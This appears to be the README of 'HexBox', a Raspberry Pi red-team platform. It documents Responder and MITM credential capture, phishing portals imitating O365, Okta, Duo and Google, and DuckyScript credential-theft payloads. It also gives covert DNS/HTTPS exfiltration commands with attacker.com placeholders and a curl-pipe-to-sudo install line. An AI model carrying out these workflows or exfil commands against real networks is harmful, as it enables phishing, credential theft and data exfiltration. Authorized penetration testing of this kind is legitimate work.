# ⬡ HexBox — Raspberry Pi Red Team Command Center

> *"One box to rule them all."*

![HexBox Banner](/images/hexbox-banner.png)

[![Status](https://img.shields.io/badge/status-operational-brightgreen)](https://github.com/aingram702/hexbox)
[![Platform](https://img.shields.io/badge/platform-Raspberry%20Pi%203B%20%7C%204%20%7C%205-c51a4a)](https://www.raspberrypi.com/)
[![Python](https://img.shields.io/badge/python-3.9%2B-3776AB)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-Authorized%20Use%20Only-black)](#license)

HexBox is a portable, self-contained offensive security platform that turns a **Raspberry Pi 3B, 4, or 5** into a full-spectrum red team command center. It orchestrates an arsenal of Hak5 attack hardware — WiFi Pineapple, Bash Bunny, LAN Turtle, OMG Plug, and more — through a single authenticated web dashboard, streaming captured intelligence in real time and enabling covert exfiltration from any network position.

Drop it in a backpack. Plug it in. Own the engagement.

---

## ⚠️ Legal Notice

**This toolkit is for AUTHORIZED penetration testing and red team engagements ONLY.**

You must have **explicit written permission** from the target system/network owner before deploying any component of HexBox. Unauthorized use is **illegal** and may result in criminal prosecution under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide.

The authors and contributors assume **zero liability** for misuse. You are the operator — you are responsible for every action taken with this tool.

---

## Table of Contents

- [What is HexBox?](#-what-is-hexbox)
- [Architecture](#-architecture)
- [Features](#-features)
- [Hardware Requirements](#-hardware-requirements)
- [Software Requirements](#-software-requirements)
- [Quick Start](#-quick-start)
- [Configuration](#-configuration)
- [Dashboard Reference](#-dashboard-reference)
- [Engagement Workflows](#-engagement-workflows)
- [Credential Catcher](#-credential-catcher)
- [Covert Exfiltration](#-covert-exfiltration)
- [Mobile Companion App](#-mobile-companion-app)
- [File Structure](#-file-structure)
- [OPSEC](#-opsec)
- [Troubleshooting](#-troubleshooting)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)

---

## 🎯 What is HexBox?

HexBox is a **command-and-control hub** for the Hak5 hardware ecosystem. It integrates every attack device through a unified Flask dashboard that runs on the Pi and is accessible from any browser on your management network.

| Device | Default IP | Role |
|--------|------------|------|
| 🍍 **WiFi Pineapple** | `172.16.42.1` | Rogue AP, Evil Portal, handshake capture, deauth |
| 🦈 **Shark Jack** | `172.16.24.1` | Drop-and-go nmap recon, fast network sweeps |
| 🐿️ **Packet Squirrel** | `172.16.32.1` | Inline MITM, traffic capture, DNS spoofing |
| 🐢 **LAN Turtle** | `172.16.84.1` | Persistent foothold, AutoSSH reverse tunnel, Responder |
| 🔌 **OMG Plug** | `192.168.1.50` | Wireless HID payload delivery via DuckyScript |
| 🐇 **Bash Bunny** | `172.16.64.1` | Multi-mode HID+ECM attacks, switch-selectable payloads |
| 🐬 **Flipper Zero** | `/dev/ttyACM0` | NFC/RFID cloning, Sub-GHz capture, BadUSB |

Also integrates: **Sliver C2** (implant generation + session management), **BloodHound CE** (AD attack path visualization), **Kismet** (GPS war-driving), and a **Mobile PWA** (read-only iOS/Android companion).

---

## 🏗️ Architecture

```
                        ┌───────────────────────────────────┐
                        │      HexBox (Pi 3B / 4 / 5)        │
                        │                                   │
                        │  Flask C2 Dashboard  :1337        │
                        │  Credential Catcher  :8000        │
                        │  Sliver C2 Server    :31337       │
                        │  BloodHound CE       :8080        │
                        │  Kismet              :2501        │
                        └──────────────┬────────────────────┘
                                       │ SSH / Serial / USB
        ┌──────┬──────┬────────┬───────┼───────┬──────┬────────┐
        │      │      │        │       │       │      │        │
      🍍      🦈      🐿️       🐢      🔌      🐇     🐬    Sliver
   Pineapple  Shark  Packet  Turtle  OMG    Bunny  Flipper  Implants
             Jack  Squirrel         Plug          Zero
     WiFi    Recon   MITM   Pivot   HID   HID+ECM NFC/RFID  C2 agents
```

**Data flow:**
```
Target machines  ──(DuckyScript / Responder / MITM)──▶  loot/
loot/            ──(parse_loot.py / parse_pcap.py)──▶  Intel tab
Intel tab        ──(exfil.py)──▶  AES-256-GCM ──▶  DNS/HTTPS covert channel
hashcat          ──(cracked.txt)──▶  SSE event ──▶  Cracked Passwords panel
```

---

## 🧰 Features

### Core Platform

| Feature | Description |
|---------|-------------|
| **Unified Dashboard** | 7-tab authenticated web UI: Devices, Intel, Payloads, Loot, Logs, Report, War-Drive |
| **Token Auth** | Session-based login + `X-HexBox-Token` header auth; all routes gated; configurable via `HEXBOX_TOKEN` env var |
| **Live Event Feed** | Server-Sent Events push new loot, process changes, and crack events to every connected browser in real time |
| **Engagement Sessions** | Named sessions with target, start time, and notes; used in generated reports |
| **Software Updates** | One-click `git pull --rebase` from the dashboard; restart C2 without SSH |
| **Device Status Dots** | Parallel background ping-checks for all 7 devices; green/red indicators update every refresh |
| **Mobile PWA** | Read-only companion at `/mobile`; installable as home-screen app on Android/iOS |

### Intelligence & Analysis

| Feature | Description |
|---------|-------------|
| **NTLM Hash Extraction** | Auto-parses NTLMv1/v2 hashes from all Responder log files; deduplicates; copy-to-clipboard |
| **WiFi Credential Table** | Stolen WiFi profiles parsed from `.txt` dumps; SSID + plaintext password table |
| **Network Map** | nmap XML auto-parsed into a sortable host/service/role table; DC, web server, and printer role inference |
| **System Profiles** | Hostname, domain, local admins, IPs, AV products, running processes collected from target machines |
| **AD Recon** | No-module LDAP enumeration of users, computers, and domain admins via pure .NET |
| **BloodHound Ingest** | `bloodhound_collect.ps1` collects full BloodHound v5 JSON (users/computers/groups/domains with real SIDs); one-click upload to BloodHound CE REST API |
| **PCAP Analysis** | tshark-driven extraction: protocol hierarchy, HTTP Basic/form creds, FTP/SMTP/Telnet cleartext, DNS queries, top hosts |
| **Portal Captures** | Evil Portal phishing credentials (username/password/portal/timestamp) displayed in Intel tab; persisted to `loot/portals/captures.json` |
| **Cracked Passwords** | Background file watcher detects hashcat writing `cracked.txt`; SSE event fires; Intel tab badge + table auto-refresh; both NTLMv2 and simple `HASH:plain` formats parsed |
| **HTML Report** | One-click self-contained HTML engagement report covering all intel categories |

### Offense & Collection

| Feature | Description |
|---------|-------------|
| **Evil Portal Templates** | Four pixel-perfect phishing pages: O365, Okta, Duo, Google; configurable catcher IP/port + redirect URL; preview, download, or SSH-push to Pineapple |
| **DuckyScript Payload Builder** | Web UI generates custom payloads for 5 attack types (reverse shell, Chrome exfil, WiFi steal, sysinfo, AD recon) with configurable IP/port/delay |
| **Hashcat Integration** | Auto-extracts NTLMv2 hashes from Responder logs; launches `hashcat -m 5600` against rockyou; output feeds back to Intel tab |
| **Bash Bunny Control** | Install switch payloads via SFTP; pull loot; `bunny_recon.sh` (ARP + nmap) and `bunny_exfil.sh` (HID+ECM Windows credential dump) |
| **Flipper Zero Bridge** | pyserial bridge to `/dev/ttyACM0`; NFC detect, RFID read, Sub-GHz RX, BadUSB from the dashboard |
| **Sliver C2** | Start/stop `sliver-server daemon`; generate implants (Windows/Linux/macOS × amd64/arm64 × exe/shellcode/shared); list active sessions; download implants |
| **PMKID Capture** | One-click hcxdumptool PMKID attack via Pineapple API |
| **Monitor Mode** | airmon-ng toggle for the Pineapple adapter from the dashboard |
| **Responder** | LLMNR/NBT-NS/MDNS poisoning; output auto-parsed into Intel tab hashes |
| **Bettercap MITM** | ARP spoofing + DNS spoofing on the management interface |
| **Covert Exfil** | AES-256-GCM + gzip → DNS subdomain queries or HTTPS POST; background dispatch; default-key warning |

### Operational Support

| Feature | Description |
|---------|-------------|
| **GPS War-Drive** | Kismet REST API polling; live AP table (SSID, BSSID, channel, signal, encryption, GPS); Leaflet.js map with color-coded markers; CSV and KML export |
| **Loot Browser** | Download any captured file directly from the dashboard; tree grouped by category |
| **Log Viewer** | Real-time tail for all service logs; service selector + line count controls |
| **Process Manager** | Start/stop all background processes with whitelist-enforced kill buttons |
| **Engage Script** | `scripts/engage.sh` launches Pineapple, Responder, catcher, dashboard, and listeners in one shot; graceful Ctrl+C shutdown |
| **OPSEC Hardening** | `scripts/opsec.sh`: MAC randomization, hostname spoofing, bash history suppression, GPG loot encryption |
| **Pre-flight Check** | `scripts/preflight.py`: SSH-tests all devices, validates Python deps, checks tool installs, outputs GO/NO-GO |

---

## 📦 Hardware Requirements

### Supported Raspberry Pi Models

HexBox runs on Raspberry Pi 3B, 4, and 5 with Raspberry Pi OS Bullseye or Bookworm.

| Model | CPU | RAM | USB | Ethernet | WiFi | Power Required | Notes |
|-------|-----|-----|-----|----------|------|----------------|-------|
| **Pi 3B / 3B+** | Cortex-A53 1.2–1.4GHz | 1GB | USB 2.0 | 100Mbps | 2.4GHz only | 5V/2.5A (13W) Micro-USB | Minimum spec; sufficient for all features |
| **Pi 4** (recommended) | Cortex-A72 1.8GHz | 2/4/8GB | USB 3.0 + 2.0 | Gigabit | 2.4 + 5GHz | 5V/3A (15W) USB-C | Faster hashcat; USB 3.0 for quicker loot pulls |
| **Pi 5** (best performance) | Cortex-A76 2.4GHz | 4/8GB | USB 3.0 + 2.0 | Gigabit | 2.4 + 5GHz | **5V/5A (27W) USB-C** | Fastest; NVMe support via M.2 HAT; see Pi 5 notes below |

> **Pi 5 requirement:** A genuine 27W (5V/5A) USB-C supply is mandatory when running multiple Hak5 devices. With a 15W supply, the Pi 5 automatically limits USB ports to 600mA — insufficient to power the Hak5 ecosystem. Run `setup/hexbox_setup.sh` to enable `usb_max_current_enable=1` automatically.

> **Interface naming:** Raspberry Pi OS uses `eth0` and `wlan0` on all three models by default. Predictable naming (e.g. `end0`, `wlx*`) is disabled unless you enable it via `raspi-config`.

### Core (Required)

| Component | Notes |
|-----------|-------|
| **Raspberry Pi 3B, 4, or 5** | The hub — runs all C2 software |
| **64GB+ Class 10 microSD** | Faster cards (A2-rated) improve tshark and hashcat I/O |
| **Power bank** (see table above for model requirement) | ~8–10 hour runtime in the field; Pi 5 needs a 27W-capable bank |
| **Powered USB hub** (4+ ports, 2A/port) | Required — Pi USB ports can't power Hak5 devices simultaneously |
| **USB-to-Ethernet adapter** | The Pi's onboard NIC is used for management; a second NIC handles Responder/MITM |

### Hak5 Arsenal (Optional — use what you have)

| Device | Arming Mode IP | Required for |
|--------|---------------|--------------|
| WiFi Pineapple (Mark VII or Enterprise) | `172.16.42.1` | Rogue AP, Evil Portal, handshake capture |
| Shark Jack | `172.16.24.1` | Drop recon, nmap sweeps |
| Packet Squirrel (Mark II recommended) | `172.16.32.1` | Inline MITM, PCAP capture |
| LAN Turtle | `172.16.84.1` | AutoSSH foothold, Responder, pivot |
| OMG Plug / OMG Cable / OMG Adapter | `192.168.1.50` | HID payload delivery |
| Bash Bunny (Mark II) | `172.16.64.1` | HID + ECM credential exfil |
| Flipper Zero | `/dev/ttyACM0` | NFC/RFID, Sub-GHz, BadUSB |

### Optional Accessories

- 3.5" touchscreen HAT (headless field ops without a laptop)
- External 1TB USB SSD for loot storage (recommended for long engagements)
- Pelican 1200 case (drop-proof, inconspicuous)
- Travel router (routes callbacks through a different ISP for off-site C2)

---

## 💾 Software Requirements

### Raspberry Pi OS Version

| OS Release | Status | Python | pip notes |
|------------|--------|--------|-----------|
| **Bookworm** (Pi OS 12, current default) | ✅ Fully supported | 3.11 | Requires `python3-full`; uses `--break-system-packages` |
| **Bullseye** (Pi OS 11) | ✅ Fully supported | 3.9 | Standard pip install |
| Buster or older | ⚠️ Not tested | 3.7 | Dependency versions may conflict |

`setup/hexbox_setup.sh` automatically detects the OS and installs the correct extras.

### Required Tools

| Tool | Install | Required for |
|------|---------|--------------|
| Python 3.9+ | included on Pi OS | All C2 components |
| nmap | `sudo apt install nmap` | Network scanning |
| Responder | `sudo apt install responder` | LLMNR/NBT-NS poisoning |
| Bettercap | `sudo apt install bettercap` | ARP/DNS MITM |
| hashcat | `sudo apt install hashcat` | NTLMv2 cracking |
| tshark | `sudo apt install tshark` | PCAP analysis |
| Kismet | `sudo apt install kismet` | GPS war-driving |
| hcxdumptool | `sudo apt install hcxdumptool` | PMKID capture |
| aircrack-ng | `sudo apt install aircrack-ng` | Monitor mode, handshake cracking |
| Sliver C2 | `curl https://sliver.sh/install \| sudo bash` | Implant generation |
| BloodHound CE | See [BloodHound docs](https://support.bloodhoundenterprise.io/) | AD attack paths |
| gpsd | `sudo apt install gpsd gpsd-clients` | GPS war-driving coordinates |

All Python dependencies are installed automatically by `setup/hexbox_setup.sh`:

```
flask  paramiko  requests  pycryptodome  scapy  impacket  netaddr  colorama
```

---

## 🚀 Quick Start

Works on Raspberry Pi 3B, 4, and 5. Use **Raspberry Pi OS Lite (64-bit)** — Bullseye or Bookworm.

```bash
# 1. Flash Raspberry Pi OS Lite (64-bit) to your SD card via Raspberry Pi Imager
#    Enable SSH and set a hostname in the imager's Advanced Options before writing.
#    Pi 5 tip: an A2-rated microSD or NVMe via M.2 HAT significantly speeds up hashcat.

# 2. Boot the Pi and SSH in
ssh pi@<pi-ip>

# 3. Clone and provision  (auto-detects Pi model and OS version)
git clone https://github.com/aingram702/hexbox.git ~/hexbox
cd ~/hexbox
chmod +x setup/hexbox_setup.sh
sudo bash setup/hexbox_setup.sh   # installs all tools + Python deps
#   Pi 5: also sets usb_max_current_enable=1 and installs rpi-eeprom
#   Bookworm: also installs python3-full

# 4. Reboot to apply MAC spoof service and USB current settings
sudo reboot

# 5. Configure for your environment (one-time interactive setup)
bash setup/configure.sh   # shows detected interfaces and Pi model

# 6. Pre-flight check
sudo python3 scripts/preflight.py

# 7. Launch
sudo python3 ~/hexbox/c2/hexbox_c2.py &    # C2 dashboard  → :1337
python3 ~/hexbox/c2/catcher.py &           # Catcher server → :8000

# 8. Open dashboard
http://<pi-ip>:1337
```

> **Access token**: on first launch the token is printed to stdout. Set it permanently with `export HEXBOX_TOKEN="<your-token>"` or add `"api_token": "..."` to `config.json → hexbox`.

---

## ⚙️ Configuration

> 🚨 **HexBox will not work out of the box.** Your environment has different IPs and device passwords. Run `setup/configure.sh` once before deploying.

### One-Command Setup

```bash
bash setup/configure.sh
```

Prompts you for every configurable value — attacker IP, device passwords, exfil settings — and writes everything to `config.json`. Also propagates your attacker IP into all payload files automatically.

### config.json Reference

The full structure after `setup/configure.sh`:

```json
{
  "hexbox": {
    "ip":             "10.0.0.99",       // HexBox attacker IP
    "dashboard_port": 1337,
    "catcher_port":   8000,
    "loot_dir":       "~/hexbox/loot",
    "log_dir":        "~/hexbox/logs",
    "scan_target":    "192.168.1.0/24",  // default nmap target
    "api_token":      ""                 // optional: pin the dashboard token
  },
  "interfaces": {
    "management": "wlan0",   // Bettercap interface
    "responder":  "eth0"     // Responder / wired interface
  },
  "devices": {
    "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple", "api_port": 1471},
    "sharkjack":      {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
    "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
    "lanturtle":      {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
    "omgplug":        {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
    "bashbunny":      {"ip": "172.16.64.1",  "user": "root", "pass": "hak5bunny"}
  },
  "flipper":    {"serial_port": "/dev/ttyACM0"},
  "bloodhound": {"url": "http://localhost:8080", "username": "admin", "password": "BloodHound!"},
  "sliver":     {"host": "127.0.0.1", "port": 31337},
  "kismet":     {"url": "http://localhost:2501", "username": "kismet", "password": "kismet"},
  "c2":         {"external_ip": "YOUR.C2.IP.HERE", "port": 443},
  "exfil": {
    "dns_domain":       "",               // e.g. "exfil.attacker.com"
    "dns_server":       "8.8.8.8",        // IP of your authoritative NS
    "https_url":        "",               // e.g. "https://attacker.com/upload"
    "https_token":      "",               // bearer token for HTTPS endpoint
    "aes_key":          "change-me-to-32-byte-secret-key!",  // CHANGE THIS
    "https_verify_tls": true
  }
}
```

### Additional Setup

#### LAN Turtle AutoSSH
For reverse tunnels to work, you need a **public VPS** the Turtle can phone home to:
1. Create a `tunnel` user with restricted shell on your VPS
2. Run `setup/configure.sh` and enter the VPS IP when prompted for `TURTLE_IP`
3. Or manually edit `payloads/turtle_foothold.sh` and set `SERVER=<your-vps-ip>`

#### WiFi Interface Names
Defaults assume `wlan0` (Pi built-in) for Bettercap and `eth0` for Responder. Check your interface names:
```bash
ip link show
```
Update `config.json → interfaces` to match your setup.

#### External SSD for Loot
```bash
sudo mount /dev/sda1 /mnt/ssd
rm -rf ~/hexbox/loot
ln -s /mnt/ssd/loot ~/hexbox/loot
```

#### Running as a Service
To survive reboots, create a systemd unit:
```bash
sudo tee /etc/systemd/system/hexbox.service << 'EOF'
[Unit]
Description=HexBox C2 Dashboard
After=network.target

[Service]
User=root
WorkingDirectory=/home/pi/hexbox
Environment=HEXBOX_TOKEN=your-strong-secret-here
ExecStart=/usr/bin/python3 /home/pi/hexbox/c2/hexbox_c2.py
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable hexbox
sudo systemctl start hexbox
```

---

## 🖥️ Dashboard Reference

Navigate to `http://<pi-ip>:1337` and log in with your access token.

### Devices Tab

The primary control surface. Contains one card per device plus system controls.

| Card | Key Controls |
|------|-------------|
| **WiFi Pineapple** | Start/stop management AP; trigger deauth; run handshake capture; deploy Evil Portal |
| **Shark Jack** | Trigger nmap recon sweep; pull loot to `loot/shark/` |
| **Packet Squirrel** | Start/stop inline PCAP capture; pull capture files |
| **LAN Turtle** | Provision modules; trigger AutoSSH reverse tunnel |
| **OMG Plug** | Deploy payloads wirelessly; trigger browser exfil, WiFi steal, AD recon |
| **Bash Bunny** | Install Switch1/Switch2 payloads; pull loot; run SSH-triggered commands |
| **Flipper Zero** | NFC detect, RFID read, Sub-GHz RX, BadUSB — via serial bridge |
| **Pi Local** | Responder, Bettercap MITM, handshake crack, hashcat |
| **Sliver C2** | Start/stop server; generate implants; view active sessions |
| **Covert Exfil** | Package + encrypt + send loot over DNS or HTTPS |
| **System** | Software updates; C2 restart; live activity feed |

### Intel Tab

All captured intelligence in one place.

| Section | Source |
|---------|--------|
| **NTLM Hashes** | Responder logs — auto-parsed, deduplicated |
| **WiFi Credentials** | `wifi_steal.ducky` output — SSID + plaintext password |
| **Network Map** | nmap XML — sortable host/service/role table |
| **Chrome Databases** | `browser_exfil.ducky` — DPAPI-encrypted Login Data files |
| **System Profiles** | `sysinfo.ps1` / `ad_recon.ps1` — hostname, domain, admins, AV |
| **BloodHound Data** | `bloodhound_collect.ps1` — one-click upload to BloodHound CE |
| **PCAP Analysis** | Packet Squirrel captures — tshark-extracted credentials and stats |
| **Portal Captures** | Evil Portal phishing — username/password/timestamp |
| **Cracked Passwords** | hashcat output — auto-updates when `cracked.txt` changes |

### Payloads Tab

- **Payload Builder**: Select type → enter callback IP/port/delay → click Build. Generates ready-to-deploy DuckyScript. Download or push directly to the OMG Plug.
- **Evil Portal**: Select template (O365/Okta/Duo/Google) → set catcher IP:port → Preview, Download, or Deploy to Pineapple.

### Loot Tab

File tree of `~/hexbox/loot/` grouped by category. Click any file to download.

### Logs Tab

Tail any service log (C2, Responder, Bettercap, hashcat, Sliver, Kismet) with configurable line count.

### Report Tab

One-click HTML engagement report. Fill in engagement name, target, and notes; click Generate. The report is self-contained HTML covering all intel categories and saved to `loot/reports/`.

### War-Drive Tab

| Control | Action |
|---------|--------|
| **▶ Start Kismet** | Launches Kismet on the management interface |
| **■ Stop Kismet** | Stops the Kismet process |
| **⟳ Refresh** | Polls Kismet REST API for new networks |
| **GPS bar** | Shows current coordinates from gpsd (if connected) |
| **AP table** | SSID, BSSID, channel, signal, encryption, GPS — sortable |
| **Leaflet map** | Interactive map with color-coded markers: green=open, red=encrypted |
| **Export CSV** | Download for Excel / LibreOffice |
| **Export KML** | Download for Google Earth / QGIS |

---

## 🔫 Engagement Workflows

### Physical Access — Quick Credential Harvest

```
1. Connect HexBox to target wired network
2. Start Responder  [Devices → Pi Local → Responder]
3. Start Bettercap  [Devices → Pi Local → Bettercap MITM]
4. Wait — NTLM hashes appear live in Intel tab
5. Launch Hashcat   [Devices → Pi Local → Hashcat]
6. Cracked plaintexts appear automatically in Intel → Cracked Passwords
```

### HID Attack — Windows Credential Dump

```
1. Build payload  [Payloads → Browser Credential Exfil]
2. Enter HexBox IP (where catcher.py is running)
3. Download the .ducky file → flash to OMG Plug or Bash Bunny
4. Plug into target USB port
5. Chrome Login DB arrives in loot/creds/; appears in Intel → Chrome Databases
```

### Wireless Attack — Evil Portal Campaign

```
1. Start WiFi Pineapple  [Devices → Pineapple]
2. Build Evil Portal     [Payloads → Evil Portal → O365 template]
3. Set catcher IP:port, set redirect URL, click Deploy to Pineapple
4. Start management AP + portal
5. Victims connect → credentials stream into Intel → Portal Captures
```

### Active Directory Enumeration

```
1. Deploy bloodhound_collect.ducky via OMG Plug on a domain-joined machine
2. BloodHound v5 JSON POSTs to catcher.py → saved in loot/bloodhound/
3. Click Upload to BloodHound  [Intel → BloodHound Data]
4. Open BloodHound CE → run attack path queries
```

### GPS War-Drive

```
1. Connect GPS receiver (any GPSd-compatible USB/serial device)
2. sudo systemctl start gpsd
3. Start Kismet  [War-Drive tab → ▶ Start Kismet]
4. Drive target area — AP table and map populate in real time
5. Export KML → open in Google Earth for site report
```

### Covert Exfiltration

```
1. Configure exfil channel in config.json → exfil (or run setup/configure.sh)
2. Set a strong, unique AES key — the default key is public!
3. Devices → Covert Exfil → select method (HTTPS preferred on monitored nets)
4. Select target (all loot or specific file)
5. Click ↑ Send — runs in background, logs status in exfil panel
```

---

## 📡 Credential Catcher

`catcher.py` is a separate Flask server (port 8000) that receives callbacks from deployed payloads.

```bash
python3 ~/hexbox/c2/catcher.py
```

| Endpoint | Method | Payload Source | Data Saved |
|----------|--------|---------------|------------|
| `/upload` | POST | `browser_exfil.ducky` | Base64-encoded Chrome Login Data → `loot/creds/<host>_chrome.db` |
| `/wifi` | POST | `wifi_steal.ducky` | WiFi profile plaintext dump → `loot/creds/<host>_wifi.txt` |
| `/sysinfo` | POST | `sysinfo.ps1` / `ad_recon.ps1` / Bunny | Base64 sysinfo JSON → `loot/creds/<host>_sysinfo.json` |
| `/bloodhound` | POST | `bloodhound_collect.ps1` | Base64 BloodHound v5 JSON → `loot/bloodhound/<host>_<type>.json` |
| `/portal` | POST | Evil Portal templates | Phishing capture → `loot/portals/captures.json` |
| `/serve/<name>` | GET | All stagers | Serves any file from `payloads/` directory |

> **Security note:** Catcher endpoints are intentionally unauthenticated — deployed payloads running on target machines have no mechanism to carry a secret. **Firewall port 8000 to your engagement network only.** Never expose catcher to the internet.

---

## 📤 Covert Exfiltration

`exfil.py` packages, compresses, encrypts, and exfiltrates loot over covert channels.

### Encryption

All exfil traffic is protected by **AES-256-GCM** (authenticated encryption):
- Key derivation: SHA-256 of your `aes_key` string → 32-byte key
- Per-session random 12-byte nonce prepended to ciphertext
- 16-byte GCM authentication tag follows nonce
- Payload gzip-compressed before encryption

### DNS Channel

```
{seq:04d}.{chunk_base32}.{session_id}.exfil.{domain}
```
- Pure stdlib `socket` — no dnspython dependency
- 50ms throttle between packets to avoid rate limits
- Terminator packet: `done.{total:04d}.{session_id}.exfil.{domain}`

**Set up the receiver** on your authoritative nameserver (example using `tcpdump`):
```bash
sudo tcpdump -i eth0 -n 'udp port 53' | grep '\.exfil\.'
# Reassemble: sort by sequence, base32-decode chunks, AES-GCM decrypt
```

### HTTPS Channel

POSTs `{"session": "...", "ts": "...", "data": "<base64_ciphertext>", "size": N}` to your endpoint.

**Receiver-side decryption:**
```python
from Crypto.Cipher import AES
import base64, gzip, hashlib

key = hashlib.sha256(b"your-aes-key-here").digest()
blob = base64.b64decode(received_data_field)
nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
plaintext = gzip.decompress(
    AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
)
# plaintext is a zip archive — extract to access loot files
```

### CLI Usage

```bash
# Exfil all loot via HTTPS
python3 ~/hexbox/c2/exfil.py https --config ~/hexbox/config.json

# Exfil a single file via DNS
python3 ~/hexbox/c2/exfil.py dns \
  --config ~/hexbox/config.json \
  --file creds/HOST_wifi.txt
```

---

## 📱 Mobile Companion App

A read-only PWA companion dashboard, accessible from any phone on your network.

### Install

1. Connect your phone to the same network as HexBox
2. Navigate to `http://<pi-ip>:1337/mobile` in your mobile browser — **while already logged in** to the dashboard
3. **Android (Chrome):** tap the menu → **Add to Home Screen**
4. **iOS (Safari):** tap the share icon → **Add to Home Screen**

> The mobile page embeds your API token at serve time. To stay authenticated after installing the app, always launch it while the main dashboard session is active, or re-visit the `/mobile` URL in browser to refresh the token embed.

### Features

- Live ops summary: hash count, WiFi creds, hosts, cracked passwords, portal captures, war-drive network count
- Active process list (shows running Responder/Bettercap/hashcat/Sliver/Kismet)
- Real-time event feed via SSE: new loot, process starts/stops, crack events
- Auto-refresh every 30 seconds
- **Read-only** — no attack controls on mobile

---

## 📁 File Structure

```
hexbox/
├── config.json                       # ← Edit this: all IPs, credentials, exfil settings
├── requirements.txt                  # Python dependencies
│
├── setup/
│   ├── hexbox_setup.sh               # One-time provisioning: tools + Python deps
│   ├── configure.sh                  # Interactive configuration wizard
│   └── install_dependancies.sh       # Install Python deps only
│
├── c2/
│   ├── hexbox_c2.py                  # Main Flask C2 dashboard (all tabs + routes)
│   ├── catcher.py                    # Credential receiver (port 8000)
│   ├── parse_loot.py                 # Intel engine: hash/WiFi/nmap/BloodHound/cracked password parsing
│   ├── parse_pcap.py                 # PCAP analysis: tshark-driven credential + protocol extraction
│   └── exfil.py                      # Encrypted exfil: AES-256-GCM over DNS or HTTPS
│
├── payloads/
│   ├── portals/
│   │   ├── o365.html                 # Evil Portal: Microsoft O365 phishing template
│   │   ├── okta.html                 # Evil Portal: Okta SSO phishing template
│   │   ├── duo.html                  # Evil Portal: Duo Security MFA phishing template
│   │   └── google.html               # Evil Portal: Google sign-in phishing template
│   │
│   ├── reverse_shell.ducky           # OMG/Bunny: TCP reverse shell to HexBox
│   ├── browser_exfil.ducky           # OMG/Bunny: Chrome credential theft via DPAPI
│   ├── wifi_steal.ducky              # OMG/Bunny: saved WiFi profile dump
│   ├── sysinfo.ducky                 # OMG/Bunny: Windows system profiling
│   ├── ad_recon.ducky                # OMG/Bunny: Active Directory enumeration
│   ├── bloodhound_collect.ducky      # OMG/Bunny: BloodHound v5 JSON collection
│   │
│   ├── chrome.ps1                    # PowerShell DPAPI exfil stager (called by browser_exfil.ducky)
│   ├── sysinfo.ps1                   # Hostname/domain/admins/AV/IP collection
│   ├── ad_recon.ps1                  # AD enumeration via .NET LDAP (no AD module required)
│   ├── bloodhound_collect.ps1        # BloodHound v5 collection (users/computers/groups/domains with SIDs)
│   │
│   ├── bunny_recon.sh                # Bash Bunny Switch 1: ARP + nmap → exfil to HexBox
│   ├── bunny_exfil.sh                # Bash Bunny Switch 2: HID+ECM Windows credential dump
│   ├── sharkjack_recon.sh            # Shark Jack: auto-recon on plug-in
│   ├── squirrel_mitm.sh              # Packet Squirrel: transparent inline MITM
│   ├── turtle_foothold.sh            # LAN Turtle: module provisioning + AutoSSH
│   └── turtle_receiver.sh            # C2-side: tunnel receiver setup
│
├── scripts/
│   ├── engage.sh                     # Master launch + graceful Ctrl+C shutdown
│   ├── opsec.sh                      # MAC randomization, GPG loot encryption, hostname spoof
│   ├── pineapple_auto.py             # Pineapple REST API automation helpers
│   └── preflight.py                  # Pre-deployment validation: GO / NO-GO
│
├── loot/                             # All captured data (auto-created, gitignored)
│   ├── creds/                        # Chrome DBs, WiFi profiles, sysinfo JSON
│   ├── nmap/                         # nmap XML + text scan results
│   ├── handshakes/                   # WPA .cap / .pcapng handshake files
│   ├── pcaps/                        # Packet Squirrel captures + uploaded PCAPs
│   ├── portals/                      # Evil Portal credential captures (captures.json)
│   ├── wardrive/                     # Kismet war-drive cache (networks.json)
│   ├── cracks/                       # hashcat scratch: ntlmv2_hashes.txt, cracked.txt
│   ├── shark/                        # Shark Jack recon output
│   ├── bunny/                        # Bash Bunny loot
│   ├── bloodhound/                   # BloodHound v5 JSON files
│   ├── implants/                     # Generated Sliver implants
│   └── reports/                      # Generated HTML engagement reports
│
└── logs/                             # Service logs (gitignored)
    ├── c2.log                        # Dashboard + route activity
    ├── responder.log
    ├── bettercap.log
    ├── hashcat.log
    └── kismet.log
```

---

## 🛡️ OPSEC

### Before Every Deployment

```bash
bash ~/hexbox/scripts/opsec.sh
```

This rotates MAC addresses, spoofs the hostname to a generic string, suppresses bash history, and GPG-encrypts existing loot.

### Critical OPSEC Rules

**Network exposure:**
- Port 1337 (dashboard) binds to `0.0.0.0` — firewall it to your management VLAN or VPN tunnel only
- Port 8000 (catcher) must be reachable by target machines for payload callbacks — isolate at the L2 level when possible
- Never expose either port to the internet without a VPN in front

**Credentials and keys:**
- `config.json` contains plaintext device passwords and your exfil AES key — never commit it to a public repo; `.gitignore` excludes it
- Change the exfil `aes_key` before every engagement — the default key is in the source code and provides zero security
- `HEXBOX_TOKEN` should be set via environment variable, not hardcoded in `config.json`, in production

**Physical capture:**
- DuckyScript payloads are plaintext on the OMG Plug — assume they're recoverable if the device is seized; factory reset if captured
- Bash Bunny payloads are installed unencrypted on the device — factory reset before surrendering
- Sliver implants in `loot/implants/` are functional malware — air-gap or firewall the Pi from untrusted networks
- Generated implants carry your C2 callback address — do not exfil them over the same channel you're attacking

**Wireless and RF:**
- Evil Portal phishing templates are pushed to the Pineapple in cleartext over SSH — use an isolated management network
- DNS exfil generates anomalous traffic (long random subdomains) — use HTTPS exfil on monitored/SOC-managed networks
- Kismet can fill your SD card rapidly on dense wireless environments — check disk space before long war-drives

**Post-engagement:**
- Run `scripts/opsec.sh` again after extraction to GPG-encrypt all loot before transit
- Wipe `loot/` and `logs/` after client delivery; shred the SD card if retiring the Pi

---

## 🔧 Troubleshooting

### Device won't connect

```bash
